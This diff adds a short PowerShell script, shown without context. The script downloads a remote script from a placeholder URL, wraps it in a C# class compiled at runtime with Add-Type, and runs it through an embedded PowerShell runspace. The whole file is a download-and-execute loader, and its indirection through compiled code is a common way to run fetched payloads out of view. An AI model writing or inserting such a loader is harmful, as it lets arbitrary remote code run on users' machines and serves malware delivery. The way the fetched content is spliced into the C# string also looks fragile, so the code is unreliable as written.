@@ -1,0 +1,20 @@
+$scriptUrl = '<url>/script.ps1'
+$scriptContent = (wget -Uri $scriptUrl -UseBasicParsing).Content
+$code = @"
+using System;
+using System.Management.Automation;
+
+public class ScriptRunner {
+    public void Execute() {
+        PowerShell ps = PowerShell.Create();
+        ps.AddScript(@"
+$scriptContent
+@");
+        ps.Invoke();
+    }
+}
+"@
+
+Add-Type -TypeDefinition $code -Language CSharp
+$scriptRunner = New-Object ScriptRunner
+$scriptRunner.Execute()
